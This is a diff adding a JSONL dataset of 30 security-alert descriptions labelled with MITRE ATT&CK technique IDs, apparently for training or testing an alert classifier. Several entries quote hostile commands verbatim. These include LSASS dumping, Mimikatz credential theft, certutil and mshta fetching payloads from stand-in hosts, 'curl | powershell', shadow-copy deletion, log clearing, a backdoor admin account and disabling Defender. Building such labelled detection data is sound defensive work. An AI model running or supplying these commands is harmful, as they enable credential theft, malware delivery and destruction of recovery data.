@@ -1,0 +1,30 @@
+{"text": "CrowdStrike: Process rundll32.exe loaded comsvcs.dll and invoked MiniDump against PID 672 (lsass.exe). Output written to C:\\Windows\\Temp\\debug.bin", "labels": ["T1003"]}
+{"text": "Defender for Endpoint: 'powershell.exe -nop -w hidden -encodedcommand JABjAGwAaQBlAG4AdAAgAD0A' launched by excel.exe on FIN-LT-0921", "labels": ["T1059"]}
+{"text": "Proofpoint TAP: user a.martin clicked a URL in an email impersonating DocuSign; landing page harvested O365 credentials", "labels": ["T1566"]}
+{"text": "Sysmon 13 RegistryValueSet: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater -> C:\\Users\\Public\\upd.exe", "labels": ["T1547"]}
+{"text": "Event 4698: A scheduled task was created. Task Name: \\Microsoft\\Windows\\Maintenance\\SysCheck Command: C:\\ProgramData\\svc.exe Author: SYSTEM", "labels": ["T1053"]}
+{"text": "vssadmin.exe delete shadows /all /quiet executed on FILESRV01 followed by wbadmin delete catalog -quiet", "labels": ["T1490"]}
+{"text": "EDR: 4,200 files renamed with extension .akira in 3 minutes on \\\\NAS01\\finance; ransom note akira_readme.txt created", "labels": ["T1486"]}
+{"text": "Zeek: host 10.4.2.19 sent 25,000 DNS queries with long random TXT subdomains to update-cdn-x.example; possible DNS tunnel", "labels": ["T1071"]}
+{"text": "Firewall: 9.8 GB uploaded over HTTPS from DB-02 to mega.nz within 40 minutes outside business hours", "labels": ["T1567"]}
+{"text": "Event 4625 x 3,412: failed logons for 380 distinct accounts from 203.0.113.50 against the VPN portal in 15 minutes", "labels": ["T1110"]}
+{"text": "net.exe group \"Domain Admins\" /domain and nltest /dclist:corp.local executed by user svc_backup", "labels": ["T1069", "T1018"]}
+{"text": "PsExec service PSEXESVC installed on HR-PC-14 from 10.1.1.20 using account CORP\\it-admin; remote cmd.exe spawned", "labels": ["T1021", "T1569"]}
+{"text": "wevtutil.exe cl Security and wevtutil cl System executed on DC02 by an interactive session", "labels": ["T1070"]}
+{"text": "certutil.exe -urlcache -split -f http://198.51.100.7/a.txt C:\\Users\\Public\\a.exe", "labels": ["T1105"]}
+{"text": "Mimikatz signature detected: sekurlsa::logonpasswords and lsadump::dcsync /user:krbtgt", "labels": ["T1003"]}
+{"text": "Web WAF: POST /cgi-bin/login exploited CVE-2024-3400 on the internet-facing GlobalProtect gateway, spawning a reverse shell", "labels": ["T1190"]}
+{"text": "Rclone.exe copy \\\\FS01\\Projects remote:backup --transfers 16 observed on a server with no backup software", "labels": ["T1567", "T1048"]}
+{"text": "Office process WINWORD.EXE spawned mshta.exe http://cdn.example.org/payload.hta", "labels": ["T1218"]}
+{"text": "Shortcut file invoice.lnk executed by user from Downloads folder, launching cmd.exe /c curl | powershell", "labels": ["T1204"]}
+{"text": "AWS GuardDuty: IAM user ci-deploy called ListBuckets, GetBucketAcl and ListObjects across 140 S3 buckets from a TOR exit node", "labels": ["T1619", "T1580"]}
+{"text": "Azure AD: new inbox rule 'move to RSS Feeds' created that forwards all mail containing 'invoice' to an external gmail address", "labels": ["T1114", "T1564"]}
+{"text": "AnyDesk.exe installed silently with --install --start-with-win --silent on 12 workstations by a non-IT account", "labels": ["T1219"]}
+{"text": "Process injection: notepad.exe executed with no arguments and opened a network connection to 45.9.148.3:443 after WriteProcessMemory from a parent dropper", "labels": ["T1055"]}
+{"text": "whoami /all; ipconfig /all; systeminfo; tasklist executed in quick succession from a newly created cmd.exe", "labels": ["T1082", "T1033", "T1016"]}
+{"text": "7z.exe a -p -mhe=on C:\\Temp\\out.7z C:\\Users\\*\\Documents executed prior to large outbound transfer", "labels": ["T1560"]}
+{"text": "Kerberos: a burst of TGS requests with RC4 encryption for 57 service accounts from a single workstation (possible Kerberoasting)", "labels": ["T1558"]}
+{"text": "New local administrator account 'support$' created via net user support$ P@ss /add && net localgroup administrators support$ /add", "labels": ["T1136", "T1098"]}
+{"text": "Windows Defender real-time protection disabled via Set-MpPreference -DisableRealtimeMonitoring $true", "labels": ["T1685"]}
+{"text": "Beacon traffic: host contacts 185.243.115.8 over HTTPS every 60 seconds with 10% jitter and identical JA3 fingerprint", "labels": ["T1071", "T1573"]}
+{"text": "Screen capture utility saved 340 screenshots to %APPDATA%\\cache\\img over 2 hours", "labels": ["T1113"]}
